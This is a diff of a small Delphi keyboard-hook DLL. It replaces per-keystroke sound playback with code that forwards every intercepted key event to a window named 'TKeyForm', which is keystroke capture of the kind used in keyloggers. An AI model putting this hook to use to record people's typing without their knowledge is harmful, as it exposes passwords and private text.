@@ -3,8 +3,7 @@ library Key;
 uses
   WinTypes,
   WinProcs,
-  Messages,
-  MMSystem;
+  Messages;
 
 const
   KeyEvent = WM_USER + 1;
@@ -13,15 +12,12 @@ var
   HookHandle   : hHook;
 
 function KeyHook(nCode: integer; WParam: Word; LParam: LongInt): Longint; stdcall;
-var KeyState: Integer;
+var LogWindowHandle: THandle;
 begin
- KeyState := lParam shr 30;
-
  if (nCode = HC_ACTION) then begin
-  if (KeyState = 0) then 
-    sndPlaySound('keydown.wav', SND_ASYNC or SND_FILENAME);
-  if (KeyState = 3) then 
-    sndPlaySound('keyup.wav', SND_ASYNC or SND_FILENAME);
+    LogWindowHandle := FindWindow('TKeyForm', nil);
+    if LogWindowHandle <> 0 then
+      SendMessage(LogWindowHandle, KeyEvent, wParam, lParam);
  end;
 
  Result := CallNextHookEx(HookHandle, nCode, WParam, LParam);
